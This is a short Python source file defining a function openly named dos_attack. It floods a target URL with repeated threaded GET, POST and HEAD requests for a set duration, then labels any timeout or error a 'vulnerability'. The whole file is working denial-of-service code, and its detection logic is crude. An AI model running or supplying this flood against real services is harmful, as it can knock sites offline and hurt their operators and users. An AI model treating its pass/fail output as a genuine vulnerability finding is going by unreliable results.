import time
import random
import requests
from threading import Thread, Lock
import asyncio

async def dos_attack(target_ip, duration=10, thread_count=10):
    results = {
        "total_requests": 0,
        "successful_responses": 0,
        "error_responses": 0,
        "timeouts": 0,
        "errors": 0,
        "latencies": [],
    }
    lock = Lock()
    methods = ["GET", "POST", "HEAD"]

    def send_request(url, results, method):
        try:
            start_time = time.time()
            if method == "GET":
                response = requests.get(url, timeout=5)
            elif method == "POST":
                response = requests.post(url, data={'param': 'test'}, timeout=5)
            elif method == "HEAD":
                response = requests.head(url, timeout=5)

            latency = time.time() - start_time

            with lock:
                results["total_requests"] += 1
                if response.status_code == 200:
                    results["successful_responses"] += 1
                else:
                    results["error_responses"] += 1
                results["latencies"].append(latency)
        except requests.exceptions.Timeout:
            with lock:
                results["timeouts"] += 1
                results["total_requests"] += 1
        except requests.exceptions.RequestException:
            with lock:
                results["errors"] += 1
                results["total_requests"] += 1

    threads = []
    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(thread_count):
            method = random.choice(methods)
            thread = Thread(target=send_request, args=(target_ip, results, method))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
        threads = []

    avg_latency = sum(results["latencies"]) / len(results["latencies"]) if results["latencies"] else 0
    if results["timeouts"] > 0 or results["error_responses"] > 0:
        return f"Vulnerability detected : {results}", results
    return f"Vulnerability not detected. Latency avrage : {avg_latency:.2f}s", results
